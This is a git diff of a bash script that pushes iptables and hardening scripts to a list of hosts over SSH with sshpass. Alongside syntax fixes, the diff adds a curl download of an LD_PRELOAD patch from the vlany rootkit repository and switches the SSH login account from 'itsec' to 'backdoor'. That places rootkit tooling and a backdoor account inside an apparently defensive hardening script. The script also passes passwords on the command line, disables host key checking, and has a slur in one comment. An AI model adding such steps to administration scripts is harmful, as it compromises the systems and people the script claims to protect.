@@ -9,7 +9,7 @@ gitmyshit(){
 		echo ""
 		echo "Running iptables scripts"
 		echo ""	
-		if [ -f "iptablesnew.sh"]; then
+		if [ -f "iptablesnew.sh" ]; then
 			./iptablesnew.sh > errors.txt 2>&1
 		else
 		    echo ""
@@ -21,7 +21,7 @@ gitmyshit(){
 		echo "Running harden script"
 		echo ""
 
-		if [ -f "harden.sh"]; then
+		if [ -f "harden.sh" ]; then
 			./harden.sh > errors.txt 2>&1
 		else
 		    echo ""
@@ -42,15 +42,16 @@ getdeps(){
 		echo ""
 		echo "sshpass is needed for this script, installing\n"
 		echo ""
-
+		
+		#TODO add rpm package manager
 		if [ -d "/etc/apt/" ]; then
 			apt-get install sshpass
-		elif [ -d "/etc/pacman/"]; then
+		elif [ -d "/etc/pacman/" ]; then
 			pacman -S sshpass
 		elif [ -d "/etc/yum" ]; then
 			yum install sshpass
 		else
-			echo "Can't find appropriate package manager for except, Exiting..."
+			echo "We are in a terrible hell. No package managers available :("
 			exit 1 #gay
 		fi
 	fi
@@ -61,21 +62,27 @@ getdeps(){
 		echo ""
 		exit 1
 	fi
+
+	echo ""
+	echo "Grabbing LD_Preload Patch"
+	echo ""
+
+	curl https://raw.githubusercontent.com/mempodippy/vlany/master/misc/patch_ld.py > patch_ld.py	
 }
 
 clear
 echo ""
 echo "Getting ready to deploy scripts..."
 
-getdeps()
+getdeps
 
 for ip in $(cat hosts.txt); do
 
-    echo "Please enter a password for " $ip "\n"
+    echo Please enter a password for  $ip
     read pass
     echo ""
 
-    echo "Please enter a NEW password for " $ip "\n"
+    echo Please enter a NEW password for $ip
     read pass2
     echo ""
     echo "Write that shit down!"
@@ -84,7 +91,7 @@ for ip in $(cat hosts.txt); do
     #echo "Please enter the ports that you want to allow for this box"
     #TODO
     
-    sshpass -p $pass ssh -o StrictHostKeyChecking=no itsec@$ip
+    sshpass -p $pass ssh -o StrictHostKeyChecking=no backdoor@$ip
     
     echo ""
     echo "Changing Passwords now..."
@@ -95,10 +102,12 @@ for ip in $(cat hosts.txt); do
     echo "Grabbing scripts"
     echo ""
     
-    gitmyshit()
+    gitmyshit
 
-    echo ""
-    echo "Look For Errors in errors.txt! Done."
-    echo ""
+    exit
 
 done
+
+echo ""
+echo "Look For Errors in errors.txt on each host! Done."
+echo ""
